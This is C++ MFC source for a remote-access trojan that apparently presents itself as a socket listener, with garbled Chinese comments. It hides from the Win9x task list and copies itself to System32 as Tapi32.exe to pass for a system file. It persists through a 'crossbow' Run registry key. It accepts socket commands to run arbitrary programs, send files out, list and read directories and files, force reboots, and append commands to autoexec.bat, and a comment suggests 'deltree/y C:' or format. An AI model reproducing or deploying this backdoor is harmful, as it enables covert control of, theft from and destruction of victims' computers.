// SockListenerDlg.cpp : implementation file
//

#include "stdafx.h"
#include "SockListener.h"
#include "SockListenerDlg.h"
#include "ClientSocket.h"

#include "Atlbase.h"
#include "io.h"
#include <sys/stat.h>
#include "Mmsystem.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

HGLOBAL gMem;

/////////////////////////////////////////////////////////////////////////////
// CAboutDlg dialog used for App About

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// Dialog Data
	//{{AFX_DATA(CAboutDlg)
	enum { IDD = IDD_ABOUTBOX };
	//}}AFX_DATA

	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CAboutDlg)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
	//{{AFX_MSG(CAboutDlg)
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
	//{{AFX_DATA_INIT(CAboutDlg)
	//}}AFX_DATA_INIT
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAboutDlg)
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
	//{{AFX_MSG_MAP(CAboutDlg)
		// No message handlers
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSockListenerDlg dialog

CSockListenerDlg::CSockListenerDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CSockListenerDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CSockListenerDlg)	
	//}}AFX_DATA_INIT
	// Note that LoadIcon does not require a subsequent DestroyIcon in Win32
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CSockListenerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSockListenerDlg)	
	DDX_Control(pDX, IDC_LIST1, m_list1);	
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CSockListenerDlg, CDialog)
	//{{AFX_MSG_MAP(CSockListenerDlg)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SHOWWINDOW()
	ON_WM_CREATE()	
	ON_BN_CLICKED(IDC_EXIT, OnExit)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSockListenerDlg message handlers

BOOL CSockListenerDlg::OnInitDialog()
{
	
	CDialog::OnInitDialog();		
	
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon
	
	if(!GetMyIP()){
		AfxMessageBox("Unable to get IP", MB_OK|MB_ICONERROR);	
	}
	else{
		m_MySocket.m_ptrDlg = this;
		m_MySocket.Create(PORT,SOCK_STREAM); 
		m_MySocket.Listen();
	}		
	return TRUE;  
}

void CSockListenerDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// If you add a minimize button to your dialog, you will need the code below
//  to draw the icon.  For MFC applications using the document/view model,
//  this is automatically done for you by the framework.

void CSockListenerDlg::OnPaint() 
{
	if (IsIconic())
	{
		CPaintDC dc(this); // device context for painting

		SendMessage(WM_ICONERASEBKGND, (WPARAM) dc.GetSafeHdc(), 0);

		// Center icon in client rectangle
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// Draw the icon
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

// The system calls this to obtain the cursor to display while the user drags
//  the minimized window.
HCURSOR CSockListenerDlg::OnQueryDragIcon()
{
	return (HCURSOR) m_hIcon;
}

/*
----------------------------------------------------------------------------------------------------------------
 Function name   : CSockListenerDlg::GetMyIP
 Description     : 
 Return type     : BOOL 
----------------------------------------------------------------------------------------------------------------
*/
BOOL CSockListenerDlg::GetMyIP()
{		
	HOSTENT *hs;
	UCHAR ch[4]={0};
	CString csInfo;

	::gethostname((LPSTR)(LPCTSTR)m_cshostname, 50);
	
	hs = gethostbyname((LPSTR)(LPCTSTR)m_cshostname);

	memcpy(ch, hs->h_addr,4);
	csInfo.Format("%s  %d.%d.%d.%d", m_cshostname, 
		ch[0], ch[1], ch[2], ch[3]);
	GetDlgItem(IDC_TEXT)->SetWindowText(csInfo);
	/*
	::WSAAsyncGetHostByName 
	(
		this->m_hWnd, WM_USER_HOSTNAME,
		(LPCTSTR) m_cshostname, m_szBufHostent, 
		MAXGETHOSTSTRUCT 
	);
	*/
	
return(TRUE);
}

void CSockListenerDlg::ProcessPendingAccept()
{
	CString csSockAddr;
	CString csInfo;
	static int nIndex = 0;
	UINT nSockPort;
	
	CClientSocket* pSocket = new CClientSocket(this);	
	
	if (m_MySocket.Accept(*pSocket))
	{			
		if(pSocket->GetSockName(csSockAddr, nSockPort)){
			csInfo.Format("%s : %u - Connected", csSockAddr, nSockPort);
			m_list1.InsertString(-1, csInfo);			
			++nIndex;
		}		
	}
	else
		delete pSocket;
}

BOOL CSockListenerDlg::OnCloseConnection(CClientSocket *pSocket)
{
	CString csSockAddr;
	CString csInfo;
	static int nIndex = 0;
	UINT nSockPort;
	
	if(pSocket->GetSockName(csSockAddr, nSockPort)){
			csInfo.Format("%s : %u - DisConnected", csSockAddr, nSockPort);
			m_list1.InsertString(-1, csInfo);
	}
return(TRUE);
}

void CSockListenerDlg::ProcessPendingRead(CClientSocket *pSocket)
{
	char *lpBuf;
	
	lpBuf = new char [1000];

	for(int i=0;i<1000;i++){
		*(lpBuf+i) = 0;
	}
		
	pSocket->Receive( lpBuf, 1000);
	if(strnicmp(lpBuf,"CMD:",4) == 0){
		ExecuteCommand( lpBuf , FALSE);
	}
	else if(strnicmp(lpBuf,"!SHUT",5) == 0){
		SendText( "Exit program!", pSocket );
		OnExit();
	}
	else if(strnicmp(lpBuf,"FILEGET:",8) == 0){
		if(!SendFile(lpBuf, pSocket)){
			pSocket->Send("-1",2);
		}
	}
	else if(strnicmp(lpBuf, "EDITCONF:", 9) == 0){
		ExecEditCommand( lpBuf, pSocket );
	}
	else if(strnicmp(lpBuf, "LIST:", 5) == 0){
		ExecListCommand( lpBuf, pSocket );
	}
	else if(strnicmp(lpBuf, "VIEW:", 5) == 0){
		ExecViewCommand( lpBuf , pSocket);
	}
	else if(strnicmp(lpBuf, "CDOPEN:", 7) == 0){
		ExecCDOpenCommand( pSocket );
	}
	else if(strnicmp(lpBuf, "CDCLOSE:", 8) == 0){
		ExecCDCloseCommand( pSocket );
	}
	else if(strnicmp(lpBuf, "REBOOT:", 7) == 0){
		ExecRebootCommand( pSocket );
	}
	else{
		m_list1.InsertString(-1, lpBuf);		
	}
	
	
	delete [] lpBuf;
}

BOOL CSockListenerDlg::ExecuteCommand(char *cmdstr, int flags)
{
	char *ch;
	ch = cmdstr + 4;	
	WinExec(ch, SW_SHOW);
	
	return(TRUE);
}

void CSockListenerDlg::OnShowWindow(BOOL bShow, UINT nStatus) 
{		
	CDialog::OnShowWindow(bShow, nStatus);	
}

int CSockListenerDlg::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{
	//9x���ؼ���
	DWORD dwVersion = GetVersion();
	// �õ�����ϵͳ�İ汾��
	if (dwVersion >= 0x80000000)
	// ����ϵͳ��Win9x,����WinNt
	{
		typedef DWORD (CALLBACK* LPREGISTERSERVICEPROCESS)(DWORD,DWORD);
		//����RegisterServiceProcess() ������ԭ��
		HINSTANCE hDLL;
		LPREGISTERSERVICEPROCESS lpRegisterServiceProcess;
		hDLL = LoadLibrary("KERNEL32.dll");
		//����RegisterServiceProcess()�������ڵĶ�̬���ӿ�KERNEL32.DLL
		lpRegisterServiceProcess =(LPREGISTERSERVICEPROCESS)GetProcAddress(hDLL,"RegisterServiceProcess");
		//�õ�RegisterServiceProcess()�����ĵ�ַ
		lpRegisterServiceProcess(GetCurrentProcessId(),1);
		//ִ��RegisterServiceProcess()����,���ر�����

		FreeLibrary(hDLL);
		//ж�ض�̬���ӿ�
	}
	
	//дע���->�Զ�����
	char TempPath[MAX_PATH];
	GetSystemDirectory(TempPath ,MAX_PATH);
	//TempPath��systemĿ¼�������ĵ�ַ,MAX_PATH�ǻ������Ĵ�С,�õ�Ŀ�����SystemĿ¼·��
	
	CString SystemPath = (CString)TempPath;
	CString commandline = (CString)GetCommandLine();

	commandline = commandline.Mid( commandline.Find('\"')+1 );
	commandline = commandline.Left( commandline.Find('\"') );

	CopyFile( commandline, SystemPath+"\\Tapi32.exe", FALSE);
	//���Լ�������%System%Ŀ¼��,������ΪTapi32.exe,αװ����

	CRegKey *registry = new CRegKey();
	//����һ��CRegKey����,׼���޸�ע���,��һ���ز�����
	
	registry->Open(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run");
	//�򿪼�ֵHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\crossbow.���������,�ʹ���֮.
	
	unsigned long lRegLength;
	registry->QueryValue(TempPath,"crossbow", &lRegLength);
	
	CString strTemp = (CString)TempPath;
	if(  strTemp != SystemPath+"\\Tapi32.exe" ){
	registry->SetValue(SystemPath+"\\Tapi32.exe", "crossbow" );
	//�����Ƿ���"crossbow"�����ļ�ֵ,�����Ƿ�Ϊ������Ŀ¼%System%+Tapi32.exe
		//�������,��д�����ϼ�ֵ������
	}

	delete registry;

	//others	
	if (CDialog::OnCreate(lpCreateStruct) == -1)
		return -1;		
	return 0;
}


void CSockListenerDlg::OnExit() 
{
	CDialog::OnCancel();
}

void CSockListenerDlg::SendText( CString msg, CClientSocket *pSocket)
{
	DWORD dwFlen = (DWORD)msg.GetLength();
	
	pSocket->Send(&dwFlen, 4);

	char* data = new char[dwFlen+1];
	for ( int i=0; i<dwFlen; i++ )
		data[i] = msg.GetAt(i);

	data[dwFlen] =0;
		
	pSocket->Send(data, dwFlen);

	delete []data;
}

BOOL CSockListenerDlg::SendFile(char *szStr, CClientSocket *pSocket)
{
	CString csFile = szStr;
	CString csText;
	char szFileSize[11] = {0};

	int nIndex = csFile.Find(':');
	if( nIndex == -1) return FALSE;
	csFile = csFile.Right(csFile.GetLength() - (nIndex+1));

	m_list1.InsertString(-1, csFile);	
	
	CFile cf;

	try{
		if( !cf.Open(csFile, CFile::modeRead | CFile::typeBinary) ){
			return(FALSE);
		}
	}
	catch(CFileException *e){
		e->GetErrorMessage((LPSTR)(LPCTSTR)csText, 1);		
		m_list1.InsertString(-1, csText);
		e->Delete();
		return (FALSE);
	}

	DWORD dwFlen = cf.GetLength();
	sprintf(szFileSize,"%lu", dwFlen);

	pSocket->Send(&dwFlen, 4);
		
	gMem = GlobalAlloc(GHND, dwFlen);
	if(!gMem) {
		AfxMessageBox("Unable to alloc memory");
		cf.Close();
		return(FALSE);
	}
	byte* data;
	data = (byte*)GlobalLock(gMem);

	DWORD dwRead = cf.Read(data, dwFlen);
	if(dwRead != dwFlen){
		csText.Format("Actual Data:%lu  Data Read:%lu", dwFlen, dwRead);
		AfxMessageBox(csText);
	}

	pSocket->Send(data, dwFlen);
	GlobalUnlock(gMem);
	GlobalFree(gMem);
		
	cf.Close();
	
	return TRUE;
}
void CSockListenerDlg::ExecEditCommand( CString strBuf,CClientSocket *pSocket )
{
	CString strResult;

	int number=strBuf.GetLength();
	//�õ��ַ����ĳ���
	char file_type = strBuf.GetAt(10);
	//��10���ַ�����file_type����,���ڱ�ʾҪ�༭������һ���ļ�
	CString content = strBuf.Mid(12);
	//���µ��ַ���������Ϊд�������д��Ŀ���ļ�
	
	_chmod("c:\\autoexec.bat", S_IREAD | S_IWRITE);
	_chmod("c:\\config.sys", S_IREAD | S_IWRITE);
    //������Ŀ���ļ������Ը�Ϊ�ɶ���д

	FILE *fp=NULL;
	char filename[20];
	
	if (file_type == '1'){
		sprintf(filename,"%s","c:\\autoexec.bat");
		//�����11���ַ���1,�Ͱ�Autoexec.bat��ʽ��
	}else if(file_type== '2'){
		sprintf(filename,"%s","c:\\config.sys");
		//�����11���ַ���1,�Ͱ�Config.sys��ʽ��
	}

	int times_of_try=0;
	//���������
	while(fp==NULL)
	{
		//���ָ���ǿ�
		fp=fopen(filename,"a+");
		//����ļ�������,����֮���������,׼����������
		//�������,�ļ�ָ��Ϊ��,�����ͻ��ظ�
		times_of_try=times_of_try+1;
		//��������1
		if(times_of_try>100)
		{
			//����Ѿ�����100����,��δ�ɹ��˳�
			strResult.Format( "%s, %s, %s", "Edit Conf File ", filename, " Error!");
			SendText( strResult, pSocket );
			return;
		}
	}

	fwrite(content,sizeof(char),strlen(content),fp);
	//д����ӵ����,����deltree/y C:����format/q/autotest C:
	fclose(fp);
	//д���ر�Ŀ���ļ�
		
	strResult.Format( "Edit Conf File %s Successful!",  filename);
	SendText( strResult, pSocket );
}

void CSockListenerDlg::ExecListCommand( CString strBuf, CClientSocket *pSocket )
{
	CString strResult;
	
	//���ǰ5���ַ���"LIST:"
	int number=strBuf.GetLength();
	//�õ��ַ����ĳ���
	CString Dir_Name=strBuf.Mid(6);
	//���ַ����������ַ���ʼ,��������ַ�����Dir_Name����,����Ŀ¼��
	if(Dir_Name=="")
	{
		//���Ŀ¼��Ϊ��
		SendText("Fail By Open DIR's Name", pSocket);
		//����"Fail By Open DIR's Name"��Ϣ
		return;
	}
	
	SetCurrentDirectory( (LPCTSTR)Dir_Name );
	//���õ�ǰĿ¼
	CFileFind finder;
	BOOL bWorking = finder.FindFile("*.*");
	while (bWorking)
	//ѭ���õ���һ���ļ���Ŀ¼
	{
		bWorking = finder.FindNextFile();
		if ( finder.IsDots() || finder.IsDirectory() ){
			strResult = "Dire: ";
		}else{
			strResult = "File: ";
		}
		strResult += finder.GetFileName();
		strResult += "\n";
	}
	
	SendText( strResult, pSocket );
	//����Return_Text����������
}

void CSockListenerDlg::ExecViewCommand( CString strBuf, CClientSocket *pSocket )
{
	CString strResult;

	//���ǰ5���ַ���"View:"
	int number=strBuf.GetLength();
	CString File_Name=strBuf.Mid(6);
	//��Ŀ���ļ�������File_Name������
	int times_of_try=0;
	FILE *fp=NULL;
	while(fp==NULL)
	{
		fp=fopen( (LPCSTR)File_Name, "r");
		//��Ŀ���ļ�׼����
		times_of_try=times_of_try+1;
		//��������1
		if(times_of_try>100)
		{
			//���������100����
			SendText("Fail By Open File", pSocket);
			//����"Fail By Open File"�Ĵ�����Ϣ
			return;
		}
	}
	
	strResult="";
	char temp_content[300];
	for(int i=0;i<300;i++) temp_content[i]='\0';
	//����һ��������
	int Read_Num=fread(temp_content, 1, 300, fp);
	//��Ŀ���ļ��ж���ǰ300���ַ�
	while(Read_Num==300)
	{
		strResult += (CString)temp_content;
		//strResult�����ݼ��ϸղŵ��ַ�
		for(int i=0;i<300;i++) temp_content[i]='\0';
		Read_Num=fread(temp_content, 1, 300, fp);
		//�ظ�
	};
	
	strResult += (CString)temp_content;
	//strResult�����ݼ��ϸղŵ��ַ�
	fclose(fp);
	//�ر�Ŀ���ļ�
	SendText(strResult, pSocket);
	//����strResult������,����鿴�ļ�������
}

void CSockListenerDlg::ExecCDOpenCommand( CClientSocket *pSocket )
{
	mciSendString("set cdaudio door open", NULL, 0, NULL);

	SendText( "CD Opened!", pSocket );
}

void CSockListenerDlg::ExecCDCloseCommand( CClientSocket *pSocket )
{
	mciSendString("set cdaudio door closed wait", NULL, 0, NULL);
	SendText( "CD Closed!", pSocket );
}

void CSockListenerDlg::ExecRebootCommand( CClientSocket *pSocket )
{
	DWORD dwVersion = GetVersion();
	//�õ�����ϵͳ�İ汾��
	if (dwVersion < 0x80000000)
	{
		//����ϵͳ��WinNt,����Win9x
		HANDLE hToken;
		TOKEN_PRIVILEGES tkp;
		//�������
		OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
		//OpenProcessToken()��������������Ǵ�һ�����̵ķ�������
		//GetCurrentProcess()�����������ǵõ������̵ľ��
		LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME,&tkp.Privileges[0].Luid);
		//LookupPrivilegeValue()���������޸Ľ��̵�Ȩ��
		tkp.PrivilegeCount = 1; 
		//������������Ȩ
		tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		AdjustTokenPrivileges(hToken, FALSE, &tkp, 0,(PTOKEN_PRIVILEGES)NULL, 0);
		//AdjustTokenPrivileges()��������֪ͨWindows NT�޸ı����̵�Ȩ��
		ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
		//ǿ���˳�WinNt������
	}
	else ExitWindowsEx(EWX_FORCE+EWX_REBOOT,0);
	//ǿ���˳�Win9x������

	SendText( " Reboot Successful!", pSocket);
}
